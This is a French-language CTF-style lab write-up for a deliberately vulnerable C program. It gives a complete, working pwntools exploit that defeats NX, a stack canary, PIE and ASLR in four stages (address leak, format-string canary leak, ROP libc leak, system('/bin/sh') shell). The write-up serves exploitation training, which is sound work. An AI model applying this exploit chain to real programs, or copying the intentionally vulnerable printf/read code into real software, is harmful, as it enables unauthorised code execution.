# Write-up — Lab 09 : Full Combo — NX + Canary + PIE + ASLR

> **Pilier 3 — Embarqué / C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · 2026

[![Full Combo](https://img.shields.io/badge/Full-NX%2BCanary%2BPIE%2BASLR-red.svg)]()
[![4 Stages](https://img.shields.io/badge/exploit-4%20stages-orange.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-ROP%28%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Toutes les protections classiques actives simultanément — NX + Canary + PIE + ASLR  
**Technique :** 4 étapes — PIE leak → canary leak → libc leak → shell  
**Capstone :** Combine les techniques des Labs 06, 07 et 08 en un seul exploit  
**Résultat :** Shell interactif

---

## 2. Environnement

```text
OS     : WSL2 Ubuntu — Linux 6.6
gcc    : -g -fstack-protector-strong  (PIE activé par défaut)
ASLR   : actif
```

**checksec :**

```
Stack:  Canary found
NX:     NX enabled
PIE:    PIE enabled
ASLR:   actif
```

---

## 3. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

__asm__(".global pop_rdi\npop_rdi:\n\tpop %rdi\n\tret\n");
int main();

void vulnerable() {
    char buffer[64];

    printf("main @ %p\n", main);  // PIE leak automatique
    puts("Leak :");               // force puts dans PLT
    fflush(stdout);
    read(0, buffer, 64);
    printf(buffer);               // format string → canary leak
    fflush(stdout);

    puts("Overflow :");
    fflush(stdout);
    read(0, buffer, 200);         // overflow volontaire
}

int main() { vulnerable(); return 0; }
```

---

## 4. Stratégie en 4 étapes

```
STAGE 1 — PIE leak
  printf("main @ %p") → elf.address = main_leaked - elf.sym['main']

STAGE 2 — Canary leak
  printf(buffer) avec %11$p...%20$p → identifier valeur se terminant par 00

STAGE 3 — Libc leak
  ROP : puts(puts@GOT) → retour a vulnerable()
  libc.address = leaked_puts - libc.symbols['puts']

STAGE 4 — Shell
  ROP : ret (alignement) + system("/bin/sh")
  payload = A*72 + canary + B*8 + rop2
```

---

## 5. Exploit — `exploit.py`

```python
from pwn import *

elf  = ELF('./target')
libc = elf.libc
context.binary = elf

p = process('./target')

# STAGE 1 : PIE
line = p.recvline()
main_leaked = int(line.split(b'@ ')[1].strip(), 16)
elf.address = main_leaked - elf.sym['main']

# STAGE 2 : Canary
p.recvuntil(b'Leak :\n')
probe = b'.'.join(f'%{i}$p'.encode() for i in range(11, 21))
p.send(probe + b'\n')
leak_raw = p.recvuntil(b'Overflow :\n')
leak_data = leak_raw[:-len(b'Overflow :\n')].strip()

canary = None
for val in leak_data.split(b'.'):
    val = val.strip()
    if val.startswith(b'0x') and val.endswith(b'00'):
        num = int(val, 16)
        if num > 0x100000000:
            canary = num
            break

# STAGE 3 : Libc leak
rop1 = ROP(elf)
rop1.call(elf.plt['puts'], [elf.got['puts']])
rop1.call(elf.sym['vulnerable'])

payload1 = b'A' * 72 + p64(canary) + b'B' * 8 + rop1.chain()
p.send(payload1)

leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']

p.recvline()
p.recvuntil(b'Leak :\n')
p.send(b'\n')
p.recvuntil(b'Overflow :\n')

# STAGE 4 : Shell
rop2 = ROP([elf, libc])
ret_gadget = rop2.find_gadget(['ret'])[0]
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
rop2.raw(ret_gadget)
rop2.call(system, [binsh])

payload2 = b'A' * 72 + p64(canary) + b'B' * 8 + rop2.chain()
p.send(payload2)
p.interactive()
```

---

## 6. Progression des protections

| Lab | Technique | NX | Canary | PIE | ASLR |
| --- | --- | --- | --- | --- | --- |
| 05 | ROP ret2libc | On | Off | Off | Off |
| 06 | ret2plt + ret2libc | On | Off | Off | On |
| 07 | PIE leak + ret2libc | On | Off | On | On |
| 08 | Canary leak + overflow | On | On | Off | On |
| **09** | **Full combo — 4 stages** | **On** | **On** | **On** | **On** |

---

## 7. Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilités | printf(buffer) + read(0, buf, 200) |
| Offset overflow | 72 bytes (buffer 64 + padding 8) |
| Stage 1 | PIE base via printf("main @ %p") |
| Stage 2 | Canary via format string %11-20$p |
| Stage 3 | Libc base via puts(puts@GOT) |
| Stage 4 | system("/bin/sh") + alignement ret |

> Screenshot : [docs/lab09_full_combo.png](docs/lab09_full_combo.png)

---

*Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · Dakar, 2026*
